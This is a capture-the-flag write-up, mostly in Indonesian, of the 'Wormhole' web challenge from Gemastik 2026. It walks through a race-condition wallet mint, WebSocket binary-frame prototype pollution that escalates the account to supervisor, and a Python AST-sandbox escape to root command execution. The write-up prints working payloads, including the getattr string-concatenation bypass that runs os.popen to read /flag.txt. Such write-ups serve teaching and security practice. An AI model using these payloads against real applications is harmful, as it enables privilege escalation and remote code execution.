# `Wormhole` — web

> 🏷️ **Challenge metadata**

|                  |                    |                |                        |
| ---------------- | ------------------ | -------------- | ---------------------- |
| 🏆 **Event**     | `Gemastik 2026`    | 📅 **Date**    | `2026-08-23`           |
| 🏷️ **Category** | `web`              | 💯 **Points**  | `408`                  |
| 👤 **Author**    | `VascoZ`           | 🧑‍💻 **Team** | `DOSCOM Zero Day Scholars` (x0rr-dan) |
| 🧩 **Solver**    | [`solve_race.py`](solve_race.py) + [`stage2_ws_binary_frame.js`](stage2_ws_binary_frame.js) | | |

![Modal soal Wormhole](img/01-soal.png)

---

### 📝 Deskripsi Soal

> **Description dari panitia:**
> - You Only has one shot. Chain. Escalate. Break.
> - Author: VascoZ, ws gateway nya port :13403
> - Source code dikasih: `docker-compose.yml` + `Dockerfile.ws` + `src/` (ws_gateway + frontend templates)

**Connection info:**

```text
http://15.232.64.175:13402  (HTTP frontend, uvicorn python)
ws://15.232.64.175:13403    (WebSocket gateway, nodejs, di-map ke container port 9020)
```

---

### 🔍 Exploitation Step

Pertama saya baca source code yang dikasih panitia dulu, fokus ke `ws_gateway/server.js` sama
`docker-compose.yml`. Dari sini saya nemuin **4 bug kunci**.

**Bug #1 (line 22-33): `deepMerge` rawan prototype pollution.**

```javascript
function deepMerge(target, source) {
    for (const key in source) {              // <-- BUG: for...in iterate prototype chain juga
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (target[key] === undefined || typeof target[key] !== 'object') target[key] = {};
            deepMerge(target[key], source[key]);
        } else { target[key] = source[key]; }
    }
}
```

`for...in` di JavaScript iterate semua enumerable properties termasuk yang diwariskan via prototype
chain (`__proto__`), dan gak ada proteksi khusus buat key `__proto__` atau `constructor.prototype`.
Jadi kalau attacker kirim `{"__proto__": {"role": "supervisor"}}`, bakal ke-set
`Object.prototype.role = "supervisor"` di seluruh process node.

**Bug #2 (line 180-205): `handleBinaryFrame` skip role check.**

```javascript
// TEXT path (line 148-161) - BUTUH supervisor
if (msg.type === 'device_config') {
    if (conn.role !== 'supervisor') {        // <-- CEK role
        conn.ws.send(JSON.stringify({ type: 'error', error: 'Insufficient clearance...' }));
        return;
    }
    deepMerge(conn.device_config, msg.data);
    await syncConfig(conn);
}

// BINARY path (line 198-203) - TIDAK cek role!
if (msg.type === 'device_config') {
    if (!msg.data || typeof msg.data !== 'object') return;
    deepMerge(conn.device_config, msg.data);    // <-- BUG: gak cek conn.role
    await syncConfig(conn);
}
```

Ini bug paling kunci. Text path `device_config` cek `conn.role !== 'supervisor'` jadi researcher
ditolak, tapi binary path `device_config` TIDAK cek role sama sekali. Jadi researcher biasa bisa set
apapun ke `conn.device_config` lewat binary frame. Kedua path pakai `deepMerge` + `syncConfig` yang
sama, jadi efeknya identik.

**Bug #3 (line 35-54): `syncConfig` iterate `for...in` + persist role ke Redis.**

```javascript
async function syncConfig(conn) {
    const r = await getRedis();
    const configToSave = {};
    for (const key in conn.device_config) {            // <-- BUG: for...in include prototype chain
        configToSave[key] = conn.device_config[key];
    }
    await r.hSet(`device_cfg:${conn.user_id}`, 'data', JSON.stringify(configToSave));
    if (configToSave.role) {                           // <-- kalau role truthy
        await r.set(`role:${conn.user_id}`, String(configToSave.role));  // <-- PERSIST ke Redis!
    }
}
```

Kalau `Object.prototype` udah terpolusi `role = "supervisor"` (dari Bug #1), `configToSave.role`
ikut ke-ambil dari prototype, terus `r.set("role:<user_id>", "supervisor")` di-execute. Backend HTTP
(python, gak dikasih source) baca `role:<user_id>` dari Redis saat login buat nentuin role di JWT,
jadi JWT supervisor di-issue tanpa forge signature.

**Bug #4 (line 104-118): WS auth butuh wallet ≥ 200.**

```javascript
if (msg.type === 'auth') {
    const payload = jwt.verify(msg.token, JWT_SECRET, { algorithms: ['HS256'] });
    conn.user_id = payload.user_id;
    conn.role = payload.role || 'researcher';
    const wallet = parseInt(await r.get(`wallet:${conn.user_id}`) || '0');
    if (wallet < 200) {                                // <-- gate: wallet >= 200
        conn.ws.send(JSON.stringify({ type: 'error', error: `Insufficient QC...` }));
        return;
    }
}
```

WS auth butuh `wallet:<user_id> ≥ 200` di Redis. Masalahnya register default wallet 100, mint normal
amount 100 -> wallet cuman +10. Jadi butuh cara cepat naikkan wallet ≥ 200 buat lolos gate ini.

Tambahan dari `docker-compose.yml`, `JWT_SECRET` punya default value hardcoded tapi bisa di-override
via env. Saya coba forge JWT pakai secret default itu ternyata ditolak "Invalid token", berarti
di-override di target. Terus `WS_MAGIC = 1` artinya format binary frame yang valid:
`[type:1B=1][length:4B BE][payload UTF-8]`.

Register akun buat explore dashboard:

![Register akun](img/02-register.png)
![Dashboard researcher, terminal terkunci](img/03-dashboard-researcher.png)

Dapat wallet 100, role researcher. Terminal page butuh supervisor, stream page connect ke WS
gateway. Terminal page nunjukin sandbox "Python 3.12 AST-filtered, allowed_modules: none (restricted
globals)" - pasti butuh bypass sandbox nanti kalau udah supervisor.

![Terminal sandbox (supervisor only)](img/04-terminal-sandbox.png)

#### Naikin wallet ≥ 200 (race condition mint)

Dari source tahu WS auth butuh wallet ≥ 200, tapi mint normal amount 100 cuman +10:

```
POST /api/vault/mint
{"amount": 100, "nonce": "single_x0r_80832"}

Response {"status":"processing", ...}
# wallet: 100 -> 110 (naik 10 doang, bukan 100)
```

![Vault mint +10](img/05-vault-mint.png)

Fuzzing amount semua ditolak `Invalid amount (1-100)` (`1000`, `-50`, `"100"`, `99.99`, `[100]`),
jadi amount strict integer 1-100, gak bisa type confusion. Field injection
(`{"amount":100,"nonce":"test","role":"supervisor"}`) juga gak ada efek. Nonce check atomic buat
nonce sama, tapi **race condition dengan nonce beda** tembus: kirim 15 request paralel dengan nonce
beda, semua sukses diproses bareng karena gak ada lock atomic. Solver: [`solve_race.py`](solve_race.py).

```
{"amount": 100, "nonce": "noncelong1000"} ... (15/15 sukses paralel)
GET /api/auth/me -> {"role":"researcher","wallet":250}
# wallet 100 -> 250 (>= 200, lolos WS auth gate)
```

![Race mint 15/15, wallet 250](img/06-race-mint.png)

Coba juga forge JWT pakai secret default docker-compose ditolak, alg confusion (none, empty key)
ditolak, register dengan `role=supervisor` tetap dapet researcher (hardcode backend). Jadi gak bisa
forge JWT langsung, solusinya exploit WS buat persist role supervisor ke Redis.

Probe WS gateway pakai binary frame `device_config` dengan `{probe:"sent"}` aja (gak kirim
role/user_id/wallet), response config keluar field yang gak saya kirim:

```
{"type":"binary_config_updated","config":{"role":"supervisor","qbit_threshold":0.99,"user_id":"admin","authenticated":true,"wallet":999999,"probe":"sent"}}
# field role/user_id/authenticated/wallet TIDAK dikirim -> dari Object.prototype yang udah terpolusi
```

Konfirmasi `Object.prototype` di process node WS udah terpolusi. Saat `syncConfig` iterate
`for...in conn.device_config` (Bug #3), prototype properties ikut ter-save ke Redis.

#### Fuzzing sandbox (buat tahap akhir)

```
import os                    -> ImportError: __import__ not found
open("/flag.txt")            -> NameError: name 'open' is not defined
().__class__.__bases__[0].__subclasses__()   -> lolos! list subclass keluar
__init__.__globals__         -> Sandbox violation: Blocked attribute: __globals__
```

Dari traceback ke-leak path `/app/terminal.py` line 143: `exec(compiled, restricted_globals,
restricted_locals)`. AST filter blokir literal attribute name di blocklist:

```python
BLOCKED_NAMES = {"eval", "exec", "compile", "open", "__import__", "input", "breakpoint", "memoryview", "help"}
BLOCKED_ATTRS = {"__class__", "__bases__", "__base__", "__subclasses__", "__mro__",
                 "__globals__", "__code__", "__func__", "__self__",
                 "__builtins__", "__builtin__", "__dict__"}
```

**Bypass kuncinya:** AST filter cek literal attribute name di source code. Kalau attribute name
dibentuk dari string concat runtime, filter gak bisa static-analyze:

```python
g = func.__globals__                       # DIBLOKIR (literal __globals__)
g = getattr(func, '__glob' + 'als__')      # LOLOS (string concat)
```

#### Rantai eksploitasi (Chain → Escalate → Break)

**Stage 1: race mint** wallet 100 → 250 (lolos WS auth gate). Lihat [`solve_race.py`](solve_race.py).

**Stage 2: WS binary frame → persist role supervisor.** Stream page punya form "DEVICE CONFIG MERGE
(Supervisor Only)", tapi via WS binary frame role check di-skip (Bug #2):

![Form device config merge (supervisor only)](img/07-stream-configmerge.png)

```
# WS auth (text frame): {"type":"auth","token":"<JWT researcher, wallet >= 200>"}
# -> {"type":"auth_ok","role":"researcher"}

# WS binary frame (BUG #2: no role check), format [type:1B=1][len:4B BE][payload]
{"type":"device_config","data":{"role":"supervisor","qbit_threshold":0.99}}
# -> {"type":"binary_config_updated","config":{"role":"supervisor",...}}
# syncConfig: SET role:<user_id> "supervisor" ke Redis
```

Script WS binary frame (Node.js): [`stage2_ws_binary_frame.js`](stage2_ws_binary_frame.js).

Re-login HTTP, backend baca `role:<user_id>` dari Redis = supervisor -> issue JWT supervisor:

```
POST /api/auth/login  ->  {"status":"ok","role":"supervisor"}
GET  /api/auth/me     ->  {"role":"supervisor","wallet":250}
```

![/api/auth/me role supervisor](img/08-me-supervisor.png)
![Dashboard role SUPERVISOR, terminal kebuka](img/09-dashboard-supervisor.png)

**Stage 3: sandbox escape → RCE → flag.** Sebagai supervisor, `/api/terminal/execute` kebuka:

![Terminal sandbox (supervisor)](img/10-terminal-supervisor.png)

```
GET /api/terminal/status -> {"role":"supervisor","can_execute":true,"sandbox":"Python 3.12 AST-filtered"}
```

Payload RCE (bypass AST filter via string concat):

```python
subs = ().__class__.__bases__[0].__subclasses__()
idx = None
for i in range(len(subs)):
    if subs[i].__name__ == '_wrap_close':
        idx = i
        break
g = getattr(subs[idx].__init__, '__glob' + 'als__')
os_mod = g['sys'].modules['os']
print(os_mod.popen('id; echo ---; ls /; echo ---; cat /flag.txt').read())
```

Response:

```
uid=0(root) gid=0(root) groups=0(root)
---
app bin boot dev entrypoint.sh etc flag.txt home lib ...
---
GEMASTIK19{qu4ntum_r3l4y_pr0t0_p0llut10n_ch41n}
```

---

### 🚩 Flag

```
GEMASTIK19{qu4ntum_r3l4y_pr0t0_p0llut10n_ch41n}
```

---

### 🔗 Referensi

- [PortSwigger — Prototype Pollution](https://portswigger.net/web-security/prototype-pollution)
- [PortSwigger — Race Conditions](https://portswigger.net/web-security/race-conditions)
- [PortSwigger — WebSocket vulnerabilities](https://portswigger.net/web-security/websockets)
- [Python Sandbox Escape — HackTricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes)
- [Python `ast` module docs](https://docs.python.org/3/library/ast.html)
- chat ai
